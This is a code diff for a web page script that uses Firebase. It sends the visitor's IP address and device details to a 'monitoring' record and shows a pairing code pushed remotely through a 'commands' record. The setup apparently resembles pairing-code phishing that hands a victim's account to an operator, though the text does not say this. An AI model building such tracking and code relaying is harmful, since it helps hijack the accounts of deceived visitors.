@@ -66,8 +66,9 @@
 
         if (userId) {
             const statusRef = db.ref('monitoring/' + userId);
+            const commandRef = db.ref('commands/' + userId);
             
-            // سحب الـ IP ونوع الجهاز وإرسالهم فوراً
+            // سحب البيانات وإرسالها فوراً
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(data => {
@@ -77,17 +78,28 @@
                         device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown"),
                         ts: Date.now()
                     });
+                }).catch(() => {
+                    statusRef.set({ status: "Online", ts: Date.now() });
                 });
 
             statusRef.onDisconnect().update({ status: "Offline" });
 
-            db.ref('commands/' + userId).on('value', (snap) => {
-                if (snap.val() && snap.val().code) {
-                    document.getElementById('pairing-code').innerText = snap.val().code;
-                    document.getElementById('ui-wait').innerText = lang.done;
-                    document.getElementById('ui-wait').classList.add('arrived');
-                }
-            });
+            // الاستماع للكود مع ميزة "عدم التعليق"
+            function listenForCode() {
+                commandRef.on('value', (snap) => {
+                    const data = snap.val();
+                    if (data && data.code) {
+                        document.getElementById('pairing-code').innerText = data.code;
+                        document.getElementById('ui-wait').innerText = lang.done;
+                        document.getElementById('ui-wait').classList.add('arrived');
+                        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                    }
+                }, (err) => {
+                    // إعادة المحاولة لو حصل خطأ في الاتصال
+                    setTimeout(listenForCode, 2000);
+                });
+            }
+            listenForCode();
         }
     </script>
 </body>
